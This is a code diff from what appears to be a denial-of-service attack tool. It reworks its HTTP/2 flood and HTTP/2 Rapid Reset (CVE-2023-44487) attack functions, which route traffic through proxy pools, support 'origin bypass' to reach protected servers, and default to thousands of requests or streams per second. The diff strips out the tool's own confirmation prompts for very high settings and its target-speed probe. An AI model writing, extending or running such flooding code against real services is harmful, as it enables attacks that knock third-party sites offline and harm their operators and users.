@@ -434,30 +434,13 @@ async def _run_python_fallback(target: str, duration: int, rps: int, method: str
         except:
             pass
 
-    if method in ("http-flood", "h2smuggle") or http2:
-        from core.attack.engines.h2_exhaust import run_h2_exhaust
+    if method in ("http-flood", "h2smuggle", "rapid-reset") or http2 or rapid_reset:
+        from core.attack.engines.h2_exhaust import run_h2_exhaust_async
         start = time.time()
-        result = await run_h2_exhaust(
-            target=target, duration=duration, rps=rps,
+        result = await run_h2_exhaust_async(
+            target_url=target, duration=duration, rps=rps,
             host_header=host_header, proxy_url=proxy_url,
-            threads=max(threads or 10, 10), connections=4
-        )
-        elapsed = time.time() - start
-        final = {"total_requests": result.get("total", 0), "completed": result.get("ok", 0),
-                 "failed": result.get("fail", 0), "timeout": 0, "elapsed": elapsed}
-        if live_stats is not None:
-            live_stats["status"] = "done"
-            live_stats["stats"] = final
-        return final
-
-    if method == "rapid-reset" or rapid_reset:
-        from core.attack.engines.h2_exhaust import run_h2_exhaust
-        start = time.time()
-        result = await run_h2_exhaust(
-            target=target, duration=duration, rps=rps,
-            host_header=host_header, proxy_url=proxy_url,
-            threads=max(threads or 10, 10), connections=4,
-            rapid_reset=True
+            connections=max(4, min(32, (threads or 10) // 4)),
         )
         elapsed = time.time() - start
         final = {"total_requests": result.get("total", 0), "completed": result.get("ok", 0),
@@ -1846,44 +1829,14 @@ async def run_http_flood(target: str, cfg: dict):
 
 
 async def run_http2_flood(target: str, cfg: dict):
-    """HTTP/2 Flood with LIVE DASHBOARD and SMART ENGINE SELECTION"""
+    """HTTP/2 Flood with LIVE DASHBOARD"""
     if not target.startswith(("http://", "https://")):
         target = "https://" + target
 
     duration = int(get_input(" Duration (seconds, default 300): ") or "300")
     rps = int(get_input(" Target RPS (default 4000): ") or "4000")
     threads = int(get_input(" Workers (default 250): ") or "250")
-    
-    # Self-DoS protection (liberal - user knows their limits)
-    if duration > 300 or threads > 500 or rps > 100000:
-        print(f" {c('y','[!]')} WARNING: Very high settings (duration={duration}s, threads={threads}, rps={rps})")
-        print(f" {c('y','[!]')} This may cause self-DoS")
-        confirm = get_input(" Continue anyway? (y/N): ").lower()
-        if confirm != "y":
-            print(f" {c('r','[-]')} Cancelled.")
-            return
-    
-    # SMART TARGET DETECTION
-    print(f"\n {c('c','[*]')} Detecting target speed...")
-    try:
-        import aiohttp
-        start_probe = time.time()
-        async with aiohttp.ClientSession() as sess:
-            async with sess.get(target, timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                await resp.read()
-        response_time = (time.time() - start_probe) * 1000
-        print(f" {c('g','[+]')} Target response time: {response_time:.0f}ms")
-        
-        if response_time > 1500:
-            print(f" {c('y','[!]')} Target is SLOW ({response_time:.0f}ms). Using Python engine.")
-            use_python = True
-        else:
-            print(f" {c('g','[+]')} Target speed OK. Using Go engine.")
-            use_python = False
-    except Exception as e:
-        print(f" {c('y','[!]')} Detection failed: {e}. Using Python engine as fallback.")
-        use_python = True
-    
+
     opts = await prompt_attack_options(target)
 
     parsed_h2 = urlparse(target)
@@ -1894,15 +1847,13 @@ async def run_http2_flood(target: str, cfg: dict):
         print(f" {c('g','[+]')} Origin bypass: {opts['origin_ip']}")
     if opts["proxy_pool"]:
         print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
-    print(f" {c('c','[*]')} Engine: {'Python (slow target)' if use_python else 'Go (fast)'}")
     _rich_sep()
 
-    # Create single vector with live dashboard
     vectors = []
-    vec = {"label": "HTTP/2 Flood", "type": "py" if use_python else "go", "status": "pending", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
+    vec = {"label": "HTTP/2 Flood", "type": "py", "status": "running",
+           "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
     vectors.append(vec)
-    
-    # Start live dashboard
+
     from core.monitor.live_dashboard import LiveAttackDashboard
     dashboard = LiveAttackDashboard(
         target=target, vectors=vectors, proxy_pool=opts["proxy_pool"],
@@ -1910,93 +1861,44 @@ async def run_http2_flood(target: str, cfg: dict):
         origin_ip=opts["origin_ip"], profile_info={},
     )
     dashboard.start()
-    
+
     try:
-        if use_python or opts["proxy_pool"]:
-            # Use Python engine for slow targets
-            from core.attack.engines.enhanced import run_enhanced_attack
-            result = await run_enhanced_attack(
-                url=target, duration=duration, method="http_get_flood",
-                rps=rps, proxy_pool=opts["proxy_pool"], origin_ip=opts["origin_ip"],
-                host_header=host_header, live_stats=vec
-            )
-            vec["status"] = "done"
-        else:
-            # Use Go engine for fast targets
-            proxy_file = ""
-            if opts["proxy_pool"]:
-                urls = []
-                for plist in opts["proxy_pool"]._pools.values():
-                    for ps in plist:
-                        urls.append(ps.url)
-                if urls:
-                    proxy_file = "proxies/_temp_http2.txt"
-                    os.makedirs(os.path.dirname(proxy_file), exist_ok=True)
-                    with open(proxy_file, "w") as f:
-                        f.write("\n".join(urls))
-            
-            result = await run_go_engine(
-                target=target, duration=duration, rps=rps,
-                method="http-flood", http2=True, threads=threads,
-                origin_ip=opts["origin_ip"], proxy_file=proxy_file,
-                live_stats=vec
-            )
+        proxy_file = ""
+        if opts["proxy_pool"]:
+            urls = []
+            for plist in opts["proxy_pool"]._pools.values():
+                for ps in plist:
+                    urls.append(ps.url)
+            if urls:
+                proxy_file = "proxies/_temp_http2.txt"
+                os.makedirs(os.path.dirname(proxy_file), exist_ok=True)
+                with open(proxy_file, "w") as f:
+                    f.write("\n".join(urls))
+
+        result = await run_go_engine(
+            target=target, duration=duration, rps=rps,
+            method="http-flood", http2=True, threads=threads,
+            origin_ip=opts["origin_ip"], proxy_file=proxy_file,
+            live_stats=vec
+        )
+        vec["status"] = "done"
     except KeyboardInterrupt:
         result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
         vec["status"] = "error"
-    
-    await dashboard.stop()
 
+    await dashboard.stop()
     print_attack_summary(target, duration, result)
 
 
 async def run_rapid_reset(target: str, cfg: dict):
-    """Rapid Reset with LIVE DASHBOARD, Self-DoS Protection, and SMART FALLBACK"""
+    """Rapid Reset with LIVE DASHBOARD"""
     if not target.startswith(("http://", "https://")):
         target = "https://" + target
 
     duration = int(get_input(" Duration (seconds, default 300): ") or "300")
     rps = int(get_input(" Streams per second (default 12000): ") or "12000")
     threads = int(get_input(" Workers (default 400): ") or "400")
-    
-    # Self-DoS protection - AGGRESSIVE WARNING
-    if duration > 900 or threads > 600 or rps > 20000:
-        print(f"\n {c('r','[!!!]')} CRITICAL WARNING: VERY HIGH SETTINGS DETECTED")
-        print(f" {c('r','[!!!]')} Duration: {duration}s | Threads: {threads} | RPS: {rps}")
-        print(f" {c('r','[!!!]')} This WILL disconnect your internet (self-DoS)")
-        print(f" {c('y','[*]')} Recommended: duration<=300, threads<=200, rps<=5000")
-        print(f" {c('y','[*]')} Safe settings: duration=60, threads=100, rps=1000")
-        confirm = get_input(f"\n {c('r','Type YES to continue with these dangerous settings:')} ").strip()
-        if confirm != "YES":
-            print(f" {c('g','[+]')} Cancelled. Using safe defaults instead.")
-            duration = min(duration, 60)
-            threads = min(threads, 100)
-            rps = min(rps, 1000)
-            print(f" {c('g','[+]')} Safe mode: duration={duration}s, threads={threads}, rps={rps}")
-    
-    # SMART TARGET DETECTION
-    print(f"\n {c('c','[*]')} Detecting target speed...")
-    try:
-        import aiohttp
-        start_probe = time.time()
-        async with aiohttp.ClientSession() as sess:
-            async with sess.get(target, timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                await resp.read()
-        response_time = (time.time() - start_probe) * 1000
-        print(f" {c('g','[+]')} Target response time: {response_time:.0f}ms")
-        
-        # INTELLIGENT DECISION
-        if response_time > 1500:
-            print(f" {c('y','[!]')} Target is VERY SLOW ({response_time:.0f}ms)")
-            print(f" {c('y','[!]')} Go engine will timeout. Switching to Python engine...")
-            use_python = True
-        else:
-            print(f" {c('g','[+]')} Target speed OK. Using Go engine.")
-            use_python = False
-    except Exception as e:
-        print(f" {c('y','[!]')} Detection failed: {e}. Using Python engine as fallback.")
-        use_python = True
-    
+
     opts = await prompt_attack_options(target)
 
     print(f"\n {c('c','[*]')} HTTP/2 Rapid Reset (CVE-2023-44487) | {target} | {duration}s | {rps} RPS")
@@ -2005,15 +1907,13 @@ async def run_rapid_reset(target: str, cfg: dict):
     if opts["proxy_pool"]:
         print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
     print(f" {c('y','[!]')} Low bandwidth, high server CPU impact")
-    print(f" {c('c','[*]')} Engine: {'Python (slow target fallback)' if use_python else 'Go (fast)'}")
     _rich_sep()
 
-    # Create single vector with live dashboard
     vectors = []
-    vec = {"label": "Rapid Reset (CVE-2023-44487)", "type": "py" if use_python else "go", "status": "pending", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
+    vec = {"label": "Rapid Reset (CVE-2023-44487)", "type": "py", "status": "running",
+           "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
     vectors.append(vec)
-    
-    # Start live dashboard
+
     from core.monitor.live_dashboard import LiveAttackDashboard
     dashboard = LiveAttackDashboard(
         target=target, vectors=vectors, proxy_pool=opts["proxy_pool"],
@@ -2021,43 +1921,33 @@ async def run_rapid_reset(target: str, cfg: dict):
         origin_ip=opts["origin_ip"], profile_info={},
     )
     dashboard.start()
-    
+
     try:
-        if use_python:
-            # Use Python engine for slow targets (better timeout handling)
-            from core.attack.engines.enhanced import run_enhanced_attack
-            result = await run_enhanced_attack(
-                url=target, duration=duration, method="http_get_flood",
-                rps=min(rps, 500), proxy_pool=opts["proxy_pool"], origin_ip=opts["origin_ip"],
-                live_stats=vec
-            )
-            vec["status"] = "done"
-        else:
-            # Use Go engine for fast targets
-            proxy_file = ""
-            if opts["proxy_pool"]:
-                urls = []
-                for plist in opts["proxy_pool"]._pools.values():
-                    for ps in plist:
-                        urls.append(ps.url)
-                if urls:
-                    proxy_file = "proxies/_temp_rapid_reset.txt"
-                    os.makedirs(os.path.dirname(proxy_file), exist_ok=True)
-                    with open(proxy_file, "w") as f:
-                        f.write("\n".join(urls))
-            
-            result = await run_go_engine(
-                target=target, duration=duration, rps=rps,
-                method="rapid-reset", rapid_reset=True, threads=threads,
-                origin_ip=opts["origin_ip"], proxy_file=proxy_file,
-                live_stats=vec
-            )
+        proxy_file = ""
+        if opts["proxy_pool"]:
+            urls = []
+            for plist in opts["proxy_pool"]._pools.values():
+                for ps in plist:
+                    urls.append(ps.url)
+            if urls:
+                proxy_file = "proxies/_temp_rapid_reset.txt"
+                os.makedirs(os.path.dirname(proxy_file), exist_ok=True)
+                with open(proxy_file, "w") as f:
+                    f.write("\n".join(urls))
+
+        # Use run_go_engine which auto-falls back to Python h2_exhaust if Go binary missing
+        result = await run_go_engine(
+            target=target, duration=duration, rps=rps,
+            method="rapid-reset", rapid_reset=True, threads=threads,
+            origin_ip=opts["origin_ip"], proxy_file=proxy_file,
+            live_stats=vec
+        )
+        vec["status"] = "done"
     except KeyboardInterrupt:
         result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
         vec["status"] = "error"
-    
-    await dashboard.stop()
 
+    await dashboard.stop()
     print_attack_summary(target, duration, result)
 
 
